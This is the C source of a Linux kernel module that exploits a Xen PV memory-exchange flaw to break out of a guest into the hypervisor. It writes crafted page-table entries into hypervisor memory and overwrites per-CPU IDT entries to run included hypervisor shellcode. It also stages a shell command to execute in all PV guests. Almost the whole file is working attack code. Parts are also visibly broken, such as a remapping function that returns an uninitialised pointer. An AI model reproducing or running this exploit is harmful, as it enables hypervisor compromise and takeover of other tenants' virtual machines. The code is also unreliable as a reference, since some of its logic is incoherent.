#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <asm/xen/page.h>
#include <linux/sched.h>
#include <linux/moduleparam.h>
#include <asm/desc.h>
#include <asm/xen/hypercall.h>

#include "hv_shellcode.bin.h"
#include "user_shellcode.bin.h"


#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)


static unsigned long user_shellcmd_addr;
module_param(user_shellcmd_addr, ulong, 0444);
MODULE_PARM_DESC(user_shellcmd_addr, "Address of the shell command in userspace");

#define slow_print(...) ({pr_emerg(__VA_ARGS__); schedule_timeout_uninterruptible(2);})

unsigned long call_int_85(void);
void backstop_85_handler(void);

#define XENMEM_exchange 11UL
#define DOMID_SELF (0x7FF0U)
#define INTERRUPT_PAGEFAULT 14
#define VOID_PTE (mfn_pte(0, __pgprot(0)))
#define PHYSICAL_PMD_PAGE_MASK_  (((signed long)PMD_PAGE_MASK) & __PHYSICAL_MASK)
#define PHYSICAL_PUD_PAGE_MASK_  (((signed long)PUD_PAGE_MASK) & __PHYSICAL_MASK)

struct xen_memory_reservation {
    u64 extent_start;
    u64 nr_extents;
    u32 extent_order;
    u32 address_bits;
    u16 domid;
};

struct xen_memory_exchange {
    struct xen_memory_reservation in;
    struct xen_memory_reservation out;
    u64 nr_exchanged;
};

static u8 *shell_command_page;

void page_walk(unsigned long va)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);
	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
}



unsigned long read_idt_addr(void) {
  struct desc_ptr dtr;
  native_store_idt(&dtr);
  return dtr.address;
}

static int init_test(void) {
  long scp_res;

  slow_print("call_int_85 at 0x%p\n", call_int_85);
  slow_print("backstop_85_handler at 0x%p\n", backstop_85_handler);

  shell_command_page = (void*)__get_free_pages(GFP_KERNEL, 0);
  if (!shell_command_page) {
    slow_print("OOM\n");
    return -ENOMEM;
  }
  scp_res = strncpy_from_user(shell_command_page, (char __user *)user_shellcmd_addr, 0x1000);
  if (scp_res <= 0 || scp_res >= 0x1000) {
    slow_print("bad user_shellcmd_addr\n");
    return -EINVAL;
  }

  return 0;
}

static int dealloc_with_last_byte(u8 val) {
  void *victim_page_virt;
  u64 in_extent;
  u64 out_extent;
  int ret;
  struct xen_memory_exchange args;
  while (1) {
    // Find a physical page whose MFN ends with the value we want.
    // Leak everything else.
    victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
    if (!victim_page_virt) return 1;
    in_extent = virt_to_mfn(victim_page_virt);
    if ((in_extent & 0xff) != val) {
      //slow_print("got 0x%hhx, wanted 0x%hhx  (in_extent=0x%llx)\n", (u8)(in_extent & 0xff), val, in_extent);
      continue;
    }

    // Remove reference to the page.
    HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);

    // Push the page on the domheap by exchanging it for a different one.
    // This calls XENMEM_exchange with legitimate arguments; the bug is triggered
    // in try_write_byte_hyper().
    out_extent = 0; /* this is probably not exactly right */
    args = (struct xen_memory_exchange){
      .in = {
        .extent_start = (u64)&in_extent,
        .nr_extents = 1,
        .domid = DOMID_SELF
      },
      .out = {
        .extent_start = (u64)&out_extent,
        .nr_extents = 1,
        .domid = DOMID_SELF
      }
    };
    ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
    if (ret != 0) {
      slow_print("exchange in dealloc_with_last_byte() failed with %d\n", ret);
      return ret;
    }
    return 0;
  }
}

/* writes a byte to Xen-enforced readonly physical memory, clobbering the next 7 bytes.
 * may fail silently because of raciness, caller should verify.
 * rval!=0 means stuff went wrong, memory allocation failure or so.
 */
static int try_write_byte_hyper(u8 *dst, u8 val) {
  u64 target_addr = arbitrary_virt_to_machine(dst).maddr + 0xffff830000000000;
  u64 out_extent_base_addr, in_extent, nr_exchanged,
      nr_extents, in_extent_addr, in_extent_base;
  u64 content;
  void *victim_page_virt;
  struct xen_memory_exchange args;
  unsigned long ret;

  // hypervisor is lower than kernel, so hypervisor reference has to come first
  out_extent_base_addr = (target_addr & 0x7);

  victim_page_virt = (void*)__get_free_pages(GFP_KERNEL, 0);
  if (!victim_page_virt) return 1;
  in_extent = virt_to_mfn(victim_page_virt);

  // We need to do this to make steal_page() in memory_exchange() work.
  // Equivalent to xen_zap_pfn_range(victim_page_virt, 0, NULL, NULL).
  HYPERVISOR_update_va_mapping((unsigned long)victim_page_virt, VOID_PTE, 0);

  nr_exchanged = (target_addr - out_extent_base_addr) / 8;
  nr_extents = nr_exchanged + 1;
  in_extent_addr = (u64)&in_extent;
  in_extent_base = in_extent_addr - (nr_exchanged * 8);

  if (dealloc_with_last_byte(val))
    return 1;

  args = (struct xen_memory_exchange){
    .in = {
      .extent_start = in_extent_base,
      .nr_extents = nr_extents,
      .domid = DOMID_SELF
    },
    .out = {
      .extent_start = out_extent_base_addr,
      .nr_extents = nr_extents,
      .domid = DOMID_SELF
    },
    .nr_exchanged = nr_exchanged
  };
  // ret = HYPERVISOR_memory_op(XENMEM_exchange, &args);
  content = (u64) val;
  ret = HYPERVISOR_arbitrary_access(
          args.out.extent_start + 8 * args.nr_exchanged,
          &content,
          sizeof(u64),
          ARBITRARY_WRITE_LINEAR

  );
  if (ret) {
    slow_print("try_write_byte_hyper: hypercall returns 0x%lx\n", ret);
    return ret;
  }
  return 0;
}

static int write_byte_hyper(u8 *dst, u8 val) {
  slow_print("write_byte_hyper(%p, 0x%hhx)\n", dst, val);
  while (READ_ONCE(*dst) != val) {
    if (try_write_byte_hyper(dst, val))
      return 1;
  }
  slow_print("write_byte_hyper successful\n");
  return 0;
}

/*
 * Writes a Page-Directory-Pointer-Table Entry (PDPTE) that references a Page Directory.
 * Exploits the bug to create a reference to a Page Directory we fully control.
 * 1GB of memory is mapped through the Page Directory.
 */
static int set_pud_entry(pud_t *pud, u64 pmd_phys_addr) {
  int i;

  /* data we want to write */
  u8 crafted_pud_entry[] = {
    /* flags of phys mapping:
     * present=1, write=1, user=1, pwt=0, pcd=0, a=0, d=0, ps=0
     * (including phys address zero)
     */
    0x07, 0, 0, 0, 0, 0, 0, 0,
    /* flags of adjacent mapping: present=0 (plus trailing garbage that's invisible here).
     * This is necessary because otherwise, trailing garbage from the first entry might
     * set the present bit for this entry. */
    0
  };
  *(uint64_t*)crafted_pud_entry |= pmd_phys_addr;

  slow_print("### trying to write crafted PUD entry...\n");
  for (i = 0; i < sizeof(crafted_pud_entry); i++) {
    slow_print("### writing byte %d\n", i);
    if (write_byte_hyper(((u8*)pud) + i, crafted_pud_entry[i])) {
      slow_print("### write_byte_hyper failed!\n");
      return 1;
    }
  }
  slow_print("### crafted PUD entry written\n");
  return 0;
}

/* Read a value from an arbitrary physical memory address.
 * Used for reading stuff from pagetables owned by the hypervisor.
 */
static u64 read_phys_value(u64 paddr, u64 **scratch_pt_entry, u8 **scratch_vaddr) {
  u8 *vaddr;
  if (paddr & 0x7) {
    slow_print("!!! MISALIGNED PADDR in read_phys_value() !!!\n");
  }
  **scratch_pt_entry = (0x7 | (paddr & ~0xfffUL));
  barrier();
  vaddr = ((u8*)*scratch_vaddr) + (paddr & 0xfffUL);
  (*scratch_pt_entry)++;
  (*scratch_vaddr) += 0x1000;
  return *(u64*)vaddr;
}

/* Remap hypervisor-owned memory as guest-accessible by walking hypervisor-owned pagetables. */
static void *remap_hypervisor_address(u64 vaddr, u64 **scratch_pt_entry, u8 **scratch_vaddr) {
  u64 pud_phys_addr, pmd_phys_addr, pte_phys_addr;
  u64 pud_entry, pmd_entry, pte_entry;
  u64 *page_virt_addr;
  u64 paddr_to_remap;

  if (vaddr >= 0xffff830000000000 && vaddr <= 0xffff87ffffffffff) {
    // trick question, we already know the physical address
    paddr_to_remap = vaddr - 0xffff830000000000;
  } else {
    // find PUD phys addr
    pud_phys_addr = ((unsigned long)pgd_val(*pgd_offset(current->mm, vaddr)) & PTE_PFN_MASK) + 8*pud_index(vaddr);

    pud_entry = read_phys_value(pud_phys_addr, scratch_pt_entry, scratch_vaddr);
    if (pud_entry & 0x80) {
      // 1GB hugepage
      slow_print("  1GB hugepage\n");
      paddr_to_remap = (pud_entry & PHYSICAL_PUD_PAGE_MASK_) | (vaddr & ~PUD_PAGE_MASK);
    } else {
      // find PMD phys addr, map PMD
      slow_print("  not a 1GB hugepage, basic flags 0x%llx\n", pud_entry & 0x7);
      pmd_phys_addr = ((pud_entry & PTE_PFN_MASK) + 8*pmd_index(vaddr));
      pmd_entry = read_phys_value(pmd_phys_addr, scratch_pt_entry, scratch_vaddr);
      if (pmd_entry & 0x80) {
        // 2MB hugepage
        slow_print("  2MB hugepage\n");
        paddr_to_remap = (pud_entry & PHYSICAL_PMD_PAGE_MASK_) | (vaddr & ~PMD_PAGE_MASK);
      } else {
        // find PTE phys addr, map PTE
        slow_print("  not a 2MB hugepage, basic flags 0x%llx\n", pmd_entry & 0x7);
        pte_phys_addr = ((pmd_entry & PTE_PFN_MASK) + 8*pte_index(vaddr));
        pte_entry = read_phys_value(pte_phys_addr, scratch_pt_entry, scratch_vaddr);
        paddr_to_remap = ((pte_entry & PTE_PFN_MASK) | (vaddr & 0xfffUL));
      }
    }
  }

  // remap page
  
  (*scratch_vaddr) += 0x1000;

  return (void*)( ((u64)page_virt_addr) | (paddr_to_remap & 0xfffUL) );
}

struct idt_entry {
  u16 offset_1;
  u16 selector;
  u8 ist;
  u8 type_attr;
  u16 offset_2;
  u32 offset_3;
  u32 zero;
};

void set_backstop_85_handler(void *info) {
  unsigned int cs;
  struct trap_info table[2];

  asm("movl %%cs,%0" : "=r" (cs));
  table[0] = (struct trap_info) { .vector = 0x85, .flags = 0x3, .cs = cs, .address = (unsigned long)backstop_85_handler };
  table[1] = (struct trap_info) { .address = 0 }; /* sentinel */
  HYPERVISOR_set_trap_table(table);
}

#define MAX_PHYS_CORES 1024
static unsigned long idt_addrs[MAX_PHYS_CORES];
static struct idt_entry *idt_85_remapped_addrs[MAX_PHYS_CORES];

/* virtual memory:
 *   user-pinned:  0x0000600000000000 - 0x0000600000000fff
 *   mapped by us: 0x0000600040000000 - 0x000060007fffffff (we map this using the bug, but unmap it as soon as we can)
 *   clobbered:    0x0000600080000000 - 0x00006000bfffffff
 *   mapped by us: 0xffff804000000000 - 0xffff80403fffffff (directly usable, but won't work from user ctx)
 *   mapped by us: 0xffff82d0c0000000 - 0xffff82d0ffffffff (inaccessible from guest ctx by default)
 */
#define MY_SECOND_AREA 0xffff804000000000ULL
//#define MY_SECOND_AREA 0xffff805000000000ULL
//#define MY_SECOND_AREA 0xffff82d0d0000000ULL
#define MY_THIRD_AREA  0xffff82d0c0000000ULL
#define HV_SHELLCODE_ADDR (MY_THIRD_AREA + 0x1000)

static void maybe_set_cur_physcpu_idt_entry(u64 **scratch_pt_entry, u8 **scratch_vaddr) {
  int i;
  unsigned long cur_idt_addr;

  cur_idt_addr = read_idt_addr();
  for (i=0; i<MAX_PHYS_CORES; i++) {
    if (idt_addrs[i] == cur_idt_addr)
      return;
    if (idt_addrs[i] == 0) {
      u64 int80_vaddr = cur_idt_addr + 16 * 0x80;
      struct idt_entry *int80_entry = remap_hypervisor_address(int80_vaddr, scratch_pt_entry, scratch_vaddr);
      struct idt_entry *int85_entry = int80_entry + 5;
      struct idt_entry new_entry;

      slow_print("IDT entry for 0x80 should be at 0x%llx\n", int80_vaddr);
      slow_print("remapped IDT entry for 0x80 to 0x%p\n", int80_entry);

      if ((((u64)int80_entry)&~0xfffUL) != (((u64)(int80_entry+6))&~0xfffUL)) {
        slow_print("page boundary crossed, blargh");
        return;
      }
      slow_print("IDT entry for 0x80: addr=0x%llx, selector=0x%hx, ist=0x%hhx, p=%d, dpl=%d, s=%d, type=%d\n",
          ((u64)int80_entry->offset_1) | (((u64)int80_entry->offset_2)<<16) | (((u64)int80_entry->offset_3)<<32),
          int80_entry->selector, int80_entry->ist, (int80_entry->type_attr&0x80)>>7, (int80_entry->type_attr&0x60)>>5,
          (int80_entry->type_attr&0x10)>>4, int80_entry->type_attr&0x0f);
      if ((int80_entry->type_attr&0x80) == 0 || ((int80_entry->type_attr&0x60)>>5) != 3) {
        slow_print("blargh, IDT entry 0x80 is weird\n");
        return;
      }
      new_entry = *int80_entry;
      new_entry.offset_1 = (HV_SHELLCODE_ADDR & 0xffff);
      new_entry.offset_2 = (HV_SHELLCODE_ADDR & 0xffff0000) >> 16;
      new_entry.offset_3 = HV_SHELLCODE_ADDR >> 32;
      *int85_entry = new_entry;

      idt_addrs[i] = cur_idt_addr;
      idt_85_remapped_addrs[i] = int85_entry;
      return;
    }
  }
  slow_print("warning: too many physical CPUs?\n");
}

static void clean_up_physcpu_idt_entries(void) {
  int i;

  for (i=0; i<MAX_PHYS_CORES; i++) {
    if (!idt_85_remapped_addrs[i])
      return;
    *idt_85_remapped_addrs[i] = (struct idt_entry){
      .offset_1 = 0,
      .offset_2 = 0,
      .offset_3 = 0,
      .selector = 0,
      .ist = 0,
      .type_attr = 0
    };
  }
}

static void cleanup_test(void) {
  u64 *scratch_pt_entry;
  u8 *scratch_vaddr;
  
  pgd_t *user_pgd = pgd_offset(current->mm, 0x0000600040000000);
  pud_t *user_pud = pud_offset(user_pgd, 0x0000600040000000);

  /* allocate remaining levels of tables */
  u8 *hv_shellcode_page = (void*)__get_free_pages(GFP_KERNEL, 0);
  u8 *user_shellcode_page = (void*)__get_free_pages(GFP_KERNEL, 0);
  u64 *my_pmd = (void*)__get_free_pages(GFP_KERNEL, 0);
  u64 *my_pt = (void*)__get_free_pages(GFP_KERNEL, 0);

  if (!hv_shellcode_page || !user_shellcode_page || !my_pmd || !my_pt) {
    slow_print("OOM");
    return;
  }
  memset(my_pmd, 0x00, 0x1000);
  memset(my_pt, 0x00, 0x1000);

  if (pgd_none(*user_pgd)) {
    slow_print("pgd_none(*user_pgd)\n");
    return;
  }


  /* misc debug output */
  slow_print("PML4 at %p\n", current->mm->pgd);
  page_walk((unsigned long) current->mm->pgd);
  slow_print("Page Walk from the pdf_offset of MY_SECOND_AREA\n");
  slow_print("PML4 SECOND entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_SECOND_AREA)));
  slow_print("PML4 THIRD entry: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, MY_THIRD_AREA)));
  slow_print("PML4 entry for my_pt: 0x%lx\n", (unsigned long)pgd_val(*pgd_offset(current->mm, (unsigned long) my_pt)));

  /* link my_pt in my_pmd */
  my_pmd[0] = (0x7 | virt_to_machine(my_pt).maddr);
  slow_print("page walk of my_pt\n");
  page_walk((unsigned long) my_pt);
  slow_print("page walk of my_pmd\n");
  page_walk((unsigned long) my_pmd);

  /* map target PUD as entry 0, for writing from the guest */
  my_pt[0] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_SECOND_AREA)).pgd & PTE_PFN_MASK));
  /* map HV shellcode page as entry 1, for RWX access from ring 0 (W for inline BSS) */
  my_pt[1] = (0x3 | virt_to_machine(hv_shellcode_page).maddr);
  /* map 64bit guest shellcode page as entry 2, for RX access from ring 3 */
  my_pt[2] = (0x5 | virt_to_machine(user_shellcode_page).maddr);
  /* map our userspace PUD as entry 3, for writing from the guest, so we can
   * cleanly undo the initial PUD mapping */
  my_pt[3] = (0x7 | (virt_to_machine(user_pud).maddr & ~0xfffUL));
  /* map kernel PML4 as entry 4, for writing from the guest (to grant guest access to PML4:261) */
  my_pt[4] = (0x7 | virt_to_machine(current->mm->pgd).maddr);
  /* map target PUD for MY_THIRD_AREA as entry 5, for writing from the guest */
  my_pt[5] = (0x7 | ((unsigned long) /*pgd_val*/(*pgd_offset(current->mm, MY_THIRD_AREA)).pgd & PTE_PFN_MASK));
  /* shell command to run in all PV guests */
  my_pt[6] = (0x5 | virt_to_machine(shell_command_page).maddr);

  /* *
   * A sign that the bug is not in the bug emulation is the inability to 
   * page_walk from here but being able to do so after the set_pud_entry(...)
   */

  /* set up temporary mapping through a guest userspace address */
  //slow_print("Printing the mapping before  0x0000600040000000");
  //page_walk(0x0000600040000000);
  set_pud_entry(user_pud, virt_to_machine(my_pmd).maddr);
  slow_print("Printing the mapping after 0x0000600040000000\n");
  page_walk(0x0000600040000000);
  barrier();

  /* put a reference to our PMD into the target PUD */
  slow_print("dummy\n");
  slow_print("going to link PMD into target PUD\n");
  slow_print("PMD addres %llx (plus flags %llx)\n", virt_to_machine(my_pmd).maddr,(0x7 | virt_to_machine(my_pmd).maddr));
  ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
  slow_print(" ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] =  %llx\n", ((u64*)0x0000600040000000UL)[pud_index(MY_SECOND_AREA)] );

  barrier();
  slow_print("linked PMD into target PUD\n");

  /* remove the mapping in guest userspace, together with garbage behind it */
  slow_print("going to unlink mapping via userspace PUD\n");
  //slow_print("forcing quit");
  //return;
  slow_print("((u64*)(MY_SECOND_AREA+0x3000)) : %p\n",((u64*)(MY_SECOND_AREA+0x3000)));
  //((u64*)(MY_SECOND_AREA+0x3000))[1] = 0;
  //((u64*)(MY_SECOND_AREA+0x3000))[2] = 0;
  slow_print("mapping unlink done\n");
  barrier();

  /* we have 256 pt entries reserved for scratch allocs */
  scratch_pt_entry = my_pt + 256;
  scratch_vaddr = (void*)(MY_SECOND_AREA + 256 * 0x1000UL);

  /* also map into MY_THIRD_AREA */
  ((u64*)(MY_SECOND_AREA + 0x5000))[pud_index(MY_THIRD_AREA)] = (0x7 | virt_to_machine(my_pmd).maddr);
  barrier();

  /* prepare shellcode pages */
  if (sizeof(hv_shellcode) > 0x1000 || sizeof(user_shellcode) > 0x1000) {
    slow_print("!!! HV/user shellcode too big !!!\n");
    return;
  }
  slow_print("copying HV and user shellcode...\n");
  memcpy(hv_shellcode_page, hv_shellcode, sizeof(hv_shellcode));
  memcpy(user_shellcode_page, user_shellcode, sizeof(user_shellcode));
  slow_print("copied HV and user shellcode\n");
  barrier();

  /* Okay, now set an IDT entry that permits calling the shellcode and call it.
   * This is somewhat tricky because only the IDT of the current physical CPU can
   * be located cleanly, and Xen might migrate this process to another physical CPU
   * at any time.
   * To deal with that, first tell Xen to call set_backstop_85_handler() whenever
   * we lose the race, then write to the IDT of the current physical CPU in a loop
   * until our interrupt hits the shellcode.
   */

  /* set up backstop 0x85 handler on all vCPUs */
  on_each_cpu(set_backstop_85_handler, NULL, 1);

  while (1) {
    unsigned long flag;

    flag = call_int_85(); /* put this first to exercise the backstop during development */
    slow_print("int 0x85 returned 0x%lx\n", flag);
    if (flag == 0x1337) /* returned by the HV shellcode */
      break;
    if (flag != 0x7331) {
      slow_print("weird int0x85 return, bailing out\n");
      return;
    }

    maybe_set_cur_physcpu_idt_entry(&scratch_pt_entry, &scratch_vaddr);
    barrier();
  }
  clean_up_physcpu_idt_entries();

  slow_print("=== END ===\n");
}

module_init(init_test);
module_exit(cleanup_test);
MODULE_LICENSE("GPL v2");

